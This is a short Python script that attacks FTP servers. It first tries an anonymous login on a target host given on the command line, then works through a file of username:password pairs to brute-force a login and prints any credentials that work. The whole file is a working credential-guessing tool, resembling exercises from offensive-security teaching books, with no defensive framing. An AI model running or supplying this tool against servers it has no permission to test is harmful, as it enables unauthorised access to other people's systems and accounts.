import ftplib
import argparse
import time

def anon_login(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', 'me@your.com')
        print(f'[*] {hostname} FTP Anonymous Logon Succeeded.')
        ftp.quit()
        return True
    except Exception as e:
        print(f'[-] {hostname} FTP Anonymous Logon Failed.')
        print(f'[-] Exception: {e}')
        return False

def brute_login(hostname, passwd_file):
    with open(passwd_file) as file:
        ftp = ftplib.FTP(hostname)
        for line in file:
            time.sleep(1)
            username, password = line.strip().split(':')
            print(f'[+] Trying: {username}/{password}')

            try:
                ftp.login(username, password)
                print(f'[*] {hostname} FTP Logon Succeeded: {username}/{password}')
                ftp.quit()
                return username, password
            except Exception as e:
                print(f'[-] Exception: {e}')
                pass

        print('[-] Could not brute force FTP credentials.')
        return None, None

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        usage='python ftp_login.py TARGET_HOST [-f USERPASS_FILE]'
    )
    parser.add_argument('tgt_host', type=str, metavar='TARGET_HOST',
                        help='specify the target host address')
    parser.add_argument('-f', type=str, metavar='USERPASS_FILE',
                        help='specify user/password file for brute-force attack')
    args = parser.parse_args()

    tgt_host = args.tgt_host
    pass_file = args.f

    if anon_login(tgt_host):
        print('[+] Anonymous login successful.')

    if pass_file:
        brute_login(tgt_host, pass_file)
